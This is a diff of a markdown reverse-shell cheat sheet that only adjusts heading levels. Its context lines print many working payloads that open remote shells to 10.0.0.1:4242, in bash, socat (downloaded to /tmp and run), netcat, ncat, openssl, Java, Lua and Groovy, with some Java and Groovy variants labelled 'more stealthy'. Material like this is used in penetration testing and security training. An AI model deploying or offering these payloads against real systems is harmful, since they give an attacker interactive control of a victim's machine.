@@ -12,14 +12,14 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
 ```
 
-### User Datagram Protocol
+### User Datagram Protocol | Remote Host
 
 ```
 sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 ```
 
 ## Socat
-### Install Socat
+### Socat | Install
 ```
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
@@ -167,7 +167,7 @@ rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.0.0.1 424
 ```
 ncat 10.0.0.1 4242 -e /bin/bash
 ```
-#### User Datagram Protocol
+### User Datagram Protocol
 ```
 ncat --udp 10.0.0.1 4242 -e /bin/bash
 ```
@@ -176,11 +176,11 @@ ncat --udp 10.0.0.1 4242 -e /bin/bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
 ```
-#### Ncat
+### Ncat
 ```
 ncat --ssl -vv -l -p 4242
 ```
-#### Remote Host
+### Remote Host
 ```
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
 ```
@@ -219,14 +219,14 @@ Runtime r = Runtime.getRuntime();
 Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242; cat <&5 | while read line; do $line 2>&5 >&5; done'");
 p.waitFor();
 ```
-#### Java | Alternative 1
+### Java | Alternative 1
 ```
 String host = "127.0.0.1";
 int port = 4444;
 String cmd = "cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host, port); InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(), so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try {p.exitValue(); break;}catch (Exception e){}}; p.destroy(); s.close();
 ```
-#### Java | Alternative 2
+### Java | Alternative 2
 **NOTE: This is more stealthy!**
 ```
 Thread thread = new Thread(){
@@ -255,11 +255,11 @@ strings reverse.war | grep jsp
 ```
 
 ## Lua
-#### Linux
+### Linux
 ```
 lua -e "require('socket'); require('os'); t=socket.tcp(); t:connect('10.0.0.1', '4242'); os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
-#### Windows and Linux
+### Windows and Linux
 ```
 lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -297,7 +297,7 @@ int port = 4242;
 String cmd = "cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host, port); InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try {p.exitValue(); break;}catch (Exception e){}}; p.destroy(); s.close();
 ```
-#### Groovy | Alternative 1
+### Groovy | Alternative 1
 **NOTE: This is more stealthy**
 ```
 Thread.start {
@@ -460,6 +460,7 @@ lua: os.execute('/bin/sh')
 * mysql: ! bash
 
 Alternative TTY method
+
 ```
 su - user
 su: must be run from a terminal
@@ -469,7 +470,7 @@ su - user
 
 Password: P4ssW0rD
 ```
-## Fully interactive reverse shell on Microsoft Windows
+### Fully interactive reverse shell on Microsoft Windows
 
 The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
 **ConPtyShell uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
